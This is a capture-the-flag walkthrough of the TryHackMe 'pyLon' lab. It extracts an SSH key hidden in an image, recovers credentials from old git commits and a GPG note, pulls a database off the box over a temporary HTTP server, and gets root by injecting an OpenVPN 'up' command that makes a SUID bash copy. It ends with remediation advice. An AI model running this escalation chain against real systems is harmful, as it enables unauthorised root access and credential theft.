# Try Hack Me — pyLon CTF Walkthrough

---

## Author

**PulseEinher**

---

## Introduction

**Hello, stranger — let's begin.**

![Ready to go??](./images/pylon_1.webp)

---

## Challenge Link

Today's problem is: https://tryhackme.com/room/pylonzf

---

## Challenge Overview

| Field | Details |
|---|---|
| **Machine** | pyLon (THM) |
| **Path** | Steganography Extraction → SSH Key Recovery → Password Manager Enumeration → GPG Decryption → OpenVPN Sudo Misconfiguration Abuse → SUID Shell Escalation → GPG Root Flag Decryption |
| **Key Takeaway** | Hidden credentials in steganographic content, exposed historical Git data, and chained sudo misconfigurations can be combined to escalate from limited SSH access to full root compromise, even when additional encryption layers are present. |

---

## Steganography Extraction

The provided task file was a `.jpg` image. Hidden data extraction was performed using **Stegseek** with the `rockyou.txt` wordlist:

```bash
┌──(root㉿vbox)-[~/Desktop/pylon]
└─# stegseek -sf pepper_1611998632625.jpg -wl /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "pepper"
[i] Original filename: "lone".
[i] Extracting to "pepper_1611998632625.jpg.out".
```

**MITRE ATT&CK:**
- `T1027` — Obfuscated/Compressed Files and Information
- `T1003` — Credential Discovery via Embedded Secrets
- `T1140` — Deobfuscate/Decode Files or Information

The passphrase `pepper` was identified and hidden data was extracted. The original filename was revealed as `lone`, which was noted as a potential username hint.

Further inspection using `exiftool` revealed a CyberChef recipe reference embedded in the metadata:

```bash
┌──(root㉿vbox)-[~/Desktop/pylon]
└─# exiftool pepper_1611998632625.jpg
ExifTool Version Number         : 13.36
File Name                       : pepper_1611998632625.jpg
Directory                       : .
File Size                       : 390 kB
File Modification Date/Time     : 2026:02:22 00:13:39+05:30
File Access Date/Time           : 2026:02:22 00:14:52+05:30
File Inode Change Date/Time     : 2026:02:22 00:14:42+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 12.16
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
Image Width                     : 2551
Image Height                    : 1913
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2551x1913
Megapixels                      : 4.9
```

Although the direct link was not functional, it indicated that encoding transformations such as **Hex** and **Base85** may be relevant later.

---

## SSH Key Recovery

The extracted file contained Base64-encoded content. It was decoded and decompressed:

```bash
┌──(root㉿vbox)-[~/Desktop/pylon]
└─# base64 -d pepper_1611998632625.jpg.out > out.gz

┌──(root㉿vbox)-[~/Desktop/pylon]
└─# gunzip out.gz

┌──(root㉿vbox)-[~/Desktop/pylon]
└─# ls
out  pepper_1611998632625.jpg.out

┌──(root㉿vbox)-[~/Desktop/pylon]
└─# cat out
lone_id0000777000175000017500000000343714004470261011570 0ustar  pood0gpood0g-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA45nVhEtT37sKnNBWH2VYsXbjA8vAK8e04HfrgF06NiGGQsRBLtJw
YJu73+zGO0AoETo8LYhxB5eI5D9KzboGuTDAuGZQuUq+8N/hBmfavieHLHgkRNBr0ErJ60
l2FAcDW6pDowfiwC1vsdixQ6L8kvVhdkz0GUfPAlfIRhHHtQaQnQ7wnRtdGjIPK9/S1MPs
IJOLD2S79NxS7vguw87Mp0cnRjDalaCcRE0ELUvLDKQdZlWba0kF/PciqknkDYq2mbkCRd
3jWX2Umx0WtP2wCh9BQ/
                           {REDACTED}
Bunv297nHMLFBPIEB231MNbYMDe0SU40NQ
WAGELdiAQ9i7N/SMjAJYAV2MAjbbzp5uKDUNxb3An85rUWKHXslATDh25abIY0aGZHLP5x
4B1usmPPLxGTqX19Cm65tkw8ijM6AM9+y4TNj2i3GlQBAAAAgQDN+26ilDtKImrPBv+Akg
tjsKLL005RLPtKQAlnqYfRJP1xLKKz7ocYdulaYm0syosY+caIzAVcN6lnFoBrzTZ23uwy
VB0ZsRL/9crywFn9xAE9Svbn6CxGBYQVO6xVCp+GiIXQZHpY7CMVBdANh/EJmGfCJ/gGby
mut7uOWmfiJAAAAIEA9ak9av7YunWLnDp6ZyUfaRAocSPxt2Ez8+j6m+gwYst+v8cLJ2SJ
duq0tgz7za8wNrUN3gXAgDzg4VsBUKLS3i41h1DmgqUE5SWgHrhIJw9AL1fo4YumPUkB/0
S0QMUn16v4S/fnHgZY5KDKSl4hRre5byrsaVK0oluiKsouR4EAAACBAO0uA2IvlaUcSerC
0OMkML9kGZA7uA52HKR9ZE/B4HR9QQKN4sZ+gOPfiQcuKYaDrfmRCeLddrtIulqY4amVcR
nx3u2SBx9KM6uqA2w80UlqJb8BVyM4SscUoHdmbqc9Wx5f+nG5Ab8EPPq0FNPrzrBJP5m0
43kcLdLe8Jv/ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----

┌──(root㉿vbox)-[~/Desktop/pylon/tmp]
└─# echo "ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==" | base64 -d
7·
  pylon@pylon
```

The decompressed output revealed:

- An OpenSSH private key
- Additional Base64-encoded data
- Strings referencing usernames: `lone`, `pylon`, and `pood`

The trailing Base64 fragment was decoded and confirmed additional contextual hints.

The private key portion was extracted and saved as `id_rsa`, with permissions adjusted:

```bash
chmod 600 id_rsa
```

**MITRE ATT&CK:**
- `T1552.004` — Private Keys
- `T1078` — Valid Accounts

---

## Enumeration — Port Scan

The following entry was added to the `/etc/hosts` file to simplify hostname-based interaction with the target system:

```
<TARGET_IP> pylon.thm
```

The initial enumeration phase was started by performing a full port scan against the target machine using Nmap:

```bash
nmap -p- --open <TARGET_IP>
nmap -sC -sV -p <OPEN_PORTS> <TARGET_IP>
```

```bash
┌──(root㉿vbox)-[~/Desktop/pylon]
└─# nmap -p- --open pylon.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 00:15 IST
Nmap scan report for pylon.thm (10.48.178.85)
Host is up (0.099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
222/tcp open  rsh-spx

Nmap done: 1 IP address (1 host up) scanned in 74.18 seconds

┌──(root㉿vbox)-[~/Desktop/pylon]
└─# nmap -sC -sV -p 22,222 pylon.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 00:17 IST
Nmap scan report for pylon.thm (10.48.178.85)
Host is up (0.092s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 12:9f:ae:2d:f8:af:04:bc:8d:6e:2d:55:66:a8:b7:55 (RSA)
|   256 ce:65:eb:ce:9f:3f:57:16:6a:79:45:9d:d3:d2:eb:f2 (ECDSA)
|_  256 6c:3b:a7:02:3f:a9:cd:83:f2:b9:46:6c:d0:d6:e6:ec (ED25519)
222/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 39:e1:e4:0e:b5:40:8a:b9:e0:de:d0:6e:78:82:e8:28 (RSA)
|   256 c6:f6:48:21:fd:07:66:77:fc:ca:3d:83:f5:ca:1b:a3 (ECDSA)
|_  256 17:a2:5b:ae:4e:44:20:fb:28:58:6b:56:34:3a:14:b3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 3.49 seconds
```

The scan revealed that the SSH service was running on both **port 22** and **port 222**.

---

## Initial Access — SSH via Recovered Key

Since a private key had been recovered, authentication attempts were directed toward port 222 using the username `lone`, inferred from the steganography extraction:

```bash
┌──(root㉿vbox)-[~/Desktop/pylon]
└─# ssh lone@pylon.thm -i id_rsa -p 222
```

An encryption key prompt was presented. The original steg passphrase (`pepper`) failed authentication.

The CyberChef link embedded in the image metadata was then used to encode the passphrase. As the provided link was not directly functional, the following encoding format was applied:

![Encoded format for CyberChef](./images/pylon_2.webp)

The passphrase was transformed accordingly and successfully authenticated.

---

## Password Manager Enumeration — Flag 1

Upon login, a password manager interface was presented. Option `[4] Search passwords` was selected:

```
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.

Select an option [Q] to Quit: 4
```

The keyword `flag` was used to search for any flags present in the password manager. The server revealed **FLAG 1**:

```
Please enter search term: flag


               
       SITE                        USERNAME
[1]     FLAG 1                      FLAG 1                      

Select a password [C] to cancel: 1

  Password for FLAG 1

        Username = FLAG 1
        Password = <<FLAG_1>>            

Press ENTER to continue.
```

The search function was then used again with the keyword `lone`, which revealed the password for the `lone` user. These credentials were used to authenticate into the SSH server on **port 22**.

---

## User 1 Flag

```bash
┌──(root㉿vbox)-[~/Desktop/pylon]
└─# ssh lone@pylon.thm
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lone@pylon.thm's password:
Welcome to
                   /
       __         /       __    __
     /   ) /   / /      /   ) /   )
    /___/ (___/ /____/ (___/ /   /
   /         /
  /      (_ /       by LeonM

lone@pylon:~$ ls
note_from_pood.gpg  pylon  user1.txt
lone@pylon:~$ cat user1.txt
<<USER1_FLAG>>
```

> **Note:** The easiest way to gain root privileges and capture the other flags was to exploit the PwnKit vulnerability. The details of the vulnerability and its exploitation can be found here:
> [Try Hack Me — Gaming Server (PwnKit Reference)](https://pulse-einher.medium.com)
>
> The intended method is documented below.

---

## GPG Decryption — Recovering `pood` Credentials

The encrypted file `note_from_pood.gpg` was inspected. Attempts were made to decrypt it using available keys:

```bash
gpg --list-keys
gpg --list-secret-keys
```

No usable keys were found.

Further enumeration was performed. A `.git` directory was identified inside `/home/pylon`. The commit history was examined and older commits were checked out:

```bash
lone@pylon:~/pylon$ git log
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
lone@pylon:~/pylon$ git checkout 73ba9ed2eec34a1626940f57c9a3145f5bdfd452
HEAD is now at 73ba9ed actual release! whoops
lone@pylon:~/pylon$ ls -la
total 40
drwxr-xr-x 3 lone lone 4096 Jan 30  2021 .
drwxr-x--- 6 lone lone 4096 Jan 30  2021 ..
drwxrwxr-x 8 lone lone 4096 Feb 21 19:46 .git
-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64
-rwxrwxr-x 1 lone lone 8413 Jan 30  2021 pyLon.py
-rw-rw-r-- 1 lone lone 2195 Jan 30  2021 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3973 Jan 30  2021 pyLon_db.py
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Previous HEAD position was 73ba9ed actual release! whoops
HEAD is now at cfc14d5 Initial commit!
lone@pylon:~/pylon$ ls -la
total 52
drwxr-xr-x 3 lone lone  4096 Feb 21 19:46 .
drwxr-x--- 6 lone lone  4096 Jan 30  2021 ..
drwxrwxr-x 8 lone lone  4096 Feb 21 19:46 .git
-rw-rw-r-- 1 lone lone   793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone   340 Jan 30  2021 banner.b64
-rw-rw-r-- 1 lone lone 12288 Feb 21 19:46 pyLon.db
-rw-rw-r-- 1 lone lone  2516 Feb 21 19:46 pyLon_crypt.py
-rw-rw-r-- 1 lone lone  3973 Jan 30  2021 pyLon_db.py
-rw-rw-r-- 1 lone lone 10290 Feb 21 19:46 pyLon_pwMan.py
```

Upon switching to the initial commit, a file named `pyLon.db` was discovered.

A temporary Python HTTP server was started on the target machine to exfiltrate the file:

```bash
lone@pylon:~/pylon$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
<ATTACKER_IP> - - [21/Feb/2026 19:49:14] "GET /pyLon.db HTTP/1.1" 200 -
```

From the attacker machine, the file was downloaded:

```bash
┌──(root㉿vbox)-[~/Desktop/pylon]
└─# wget http://pylon.thm:9001/pyLon.db
--2026-02-22 01:19:14--  http://pylon.thm:9001/pyLon.db
Resolving pylon.thm (pylon.thm)... 10.48.178.85
Connecting to pylon.thm (pylon.thm)|10.48.178.85|:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600 [application/octet-stream]
Saving to: 'pyLon.db'

pyLon.db   100%[=======================================================>]  600  --.-KB/s  in 0s

2026-02-22 01:19:14 (56.3 MB/s) - 'pyLon.db' saved [600/600]
```

The database was inspected using SQLite. Two tables were identified: `pwCheck` and `pwMan`.

The `pwCheck` table contained a long hash value. The `pwMan` table contained an entry referencing a GPG key:

```bash
┌──(root㉿vbox)-[~/Desktop/pylon]
└─# sqlite3 pyLon.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
pwCheck  pwMan
sqlite> .schema pwCheck
CREATE TABLE pwCheck (pwhash VARCHAR NOT NULL);
sqlite> SELECT * FROM pwCheck;
fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db
sqlite> SELECT * FROM pwMan;
pylon.thm_gpg_key|lone_gpg_key|{REDACTED}
```

Attempts were made to crack the hash using John the Ripper and online tools, but no successful result was achieved.

The older password manager file `pyLon_pwMan.py`, found in the initial commit, was executed. Its functionality differed slightly from the running version. The search feature was used again — when the keyword `gpg` was entered, the password required for the GPG file was revealed.

The encrypted file was then decrypted, revealing the password for user `pood`:

```bash
lone@pylon:~$ gpg --decrypt note_from_pood.gpg
gpg: Note: secret key D83FA5A7160FFE57 expired at Fri Jan 27 19:13:48 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is {REDACTED}

Thanks again.
```

**MITRE ATT&CK:**
- `T1083` — File and Directory Discovery
- `T1213` — Data from Information Repositories
- `T1552` — Unsecured Credentials

---

## User 2 Flag

```bash
pood@pylon:/home/lone$ cd /home/pood
pood@pylon:~$ ls
user2.txt
pood@pylon:~$ cat user2.txt
<<USER2_FLAG>>
```

---

## Privilege Escalation

### Sudo Enumeration — `pood` and `lone`

The sudo privileges were listed for user `pood`:

```bash
pood@pylon:~$ sudo -l
[sudo] password for pood:
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```

It was observed that user `pood` was permitted to edit `/opt/openvpn/client.ovpn` using `sudoedit` with root privileges. Since OpenVPN configuration files may contain script directives such as `up` or `down` which execute external commands, this was identified as a potential privilege escalation vector.

> Reference: [Sudo OpenVPN Privilege Escalation — Exploit Notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/)

However, it was noted that user `pood` could only **edit** the configuration file and was not permitted to **execute** the OpenVPN binary directly. Therefore, it was necessary to determine whether the configuration file was being actively used by a running service.

The following commands were executed to verify:

```bash
ps aux | grep openvpn
systemctl status openvpn
```

```bash
pood@pylon:~$ ps aux | grep openvpn
nobody     870  0.0  0.7  44320  3680 ?        Ss   20:06   0:00 /usr/sbin/openvpn --daemon ovpn-server --status /run/openvpn/server.status 10 --cd /etc/openvpn --script-security 2 --config /etc/openvpn/server.conf --writepid /run/openvpn/server.pid
root      2046  0.0  0.8  62472  4204 pts/0    S    20:23   0:00 sudoedit /opt/openvpn/client.ovpn
pood      2074  0.0  0.2  13220  1016 pts/0    S+   20:31   0:00 grep --color=auto openvpn
```

From this output, it was determined that the running OpenVPN service was using `/etc/openvpn/server.conf` and not `/opt/openvpn/client.ovpn`. Therefore, the edited configuration file could not be automatically triggered from the context of user `pood`.

Further enumeration was conducted to determine whether any other user possessed elevated OpenVPN execution privileges. After additional enumeration and restarting the machine from scratch, it was revealed that user `lone` could run the `.ovpn` file as a sudo user:

```bash
lone@pylon:/home/pood$ sudo -l
[sudo] password for lone:
Matching Defaults entries for lone on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

This clarified the intended exploitation path: user `pood` had permission to **edit** the configuration file, while user `lone` had permission to **execute** the OpenVPN binary with that configuration file as root.

**MITRE ATT&CK:**
- `T1548.003` — Abuse Elevation Control Mechanism: Sudo
- `T1059` — Command and Scripting Interpreter
- `T1548.001` — Setuid and Setgid

---

### Chained Privilege Escalation — OpenVPN Script Injection + SUID Shell

A chained privilege escalation strategy was formulated:

1. Modify `/opt/openvpn/client.ovpn` as user `pood`.
2. Execute the modified configuration as user `lone` using `sudo`.
3. Leverage OpenVPN's `script-security` directive to execute arbitrary commands as root.

The content of `/opt/openvpn/client.ovpn` was replaced with the following:

```
script-security 2
up "/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'"
dev null
```

The directive `script-security 2` enables execution of external scripts. The `up` directive executes the specified command when the OpenVPN tunnel initializes. In this case, a copy of `/bin/bash` was placed at `/tmp/rootbash` and the **SUID bit** was applied to allow privilege escalation.

After modifying the file as user `pood`, the session was switched to user `lone` and the following command was executed:

```bash
sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

Upon execution, the `up` script was triggered, resulting in the creation of a SUID-root binary at `/tmp/rootbash`. The root shell was spawned using:

```bash
lone@pylon:~$ ls -l /tmp/rootbash
-rwsr-sr-x 1 root root 1113504 Feb 21 20:42 /tmp/rootbash
lone@pylon:~$ /tmp/rootbash -p
rootbash-4.4# whoami
root
```

---

### GPG Root Flag Decryption

Although the effective UID was root, the real UID remained that of user `lone`. Attempting to decrypt the root flag directly resulted in a permission error:

```bash
rootbash-4.4# gpg --decrypt root.txt.gpg
gpg: can't open 'root.txt.gpg': Permission denied
gpg: decrypt_message failed: Permission denied
rootbash-4.4# id
uid=1002(lone) gid=1002(lone) euid=0(root) egid=0(root) groups=0(root),1002(lone)
```

The issue arose because GPG performs additional permission checks based on real user identity, not just effective UID.

Attempts were made to copy the file to `/tmp` and decrypt it there; however, invalid key errors were encountered. Attempts to copy secret key material from the `.gnupg` directory also failed due to permission issues.

An attempt to change the root account password was also denied:

```bash
rootbash-4.4# passwd root
passwd: You may not view or modify password information for root.
```

This operation was denied because the real user ID was not root.

To resolve this issue, the `.gnupg` directory was transferred to `/tmp` while preserving its contents. Ownership was then reassigned to user `lone` and permissions were secured:

```bash
/tmp/rootbash -p
chown -R lone:lone /tmp/rootgnupg
chmod -R 700 /tmp/rootgnupg
```

After exiting the root shell, the GPG file was decrypted as user `lone` using the relocated key material:

```bash
lone@pylon:~$ GNUPGHOME=/tmp/rootgnupg gpg --decrypt /tmp/root.txt.gpg
gpg: Note: secret key 91B77766BE20A385 expired at Fri Jan 27 19:04:03 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
<<ROOT_FLAG>> !!!
```

**MITRE ATT&CK:**
- `T1552` — Unsecured Credentials
- `T1005` — Data from Local System

---

## Remediation Recommendations

- Remove the embedded OpenSSH private key and encoded artifacts from `pepper_1611998632625.jpg`, and implement automated scanning for secrets (SSH keys, Base64 blobs, gzip archives) before distributing downloadable files.
- Eliminate sensitive data from historical Git commits inside `/home/pylon/.git`, purge the exposed `pyLon.db` database from version history, and deploy the application without its development repository to prevent rollback-based credential recovery.
- Harden the custom `pyLon` password manager by disabling unrestricted search functionality for keywords like `flag` and `gpg`, and enforce proper access controls so stored credentials cannot be enumerated by authenticated users.
- Remove cross-user sudo chaining by revoking `sudoedit /opt/openvpn/client.ovpn` from `pood` and `/usr/sbin/openvpn /opt/openvpn/client.ovpn` from `lone`, preventing file-edit-and-execute privilege escalation through OpenVPN script directives.
- Disable OpenVPN client-side script execution by removing `script-security 2` support where unnecessary, and restrict execution of external `up` directives to prevent arbitrary command execution as root.

---

## Conclusion

We are done with the machine……….

Let's move to the next, till then  
Have a good day (night too)

---

## Disclaimer

This content is intended for educational purposes only. All techniques demonstrated are performed in a controlled lab environment on machines explicitly provided for security research and learning. Unauthorized use of these techniques against real systems is illegal and unethical.
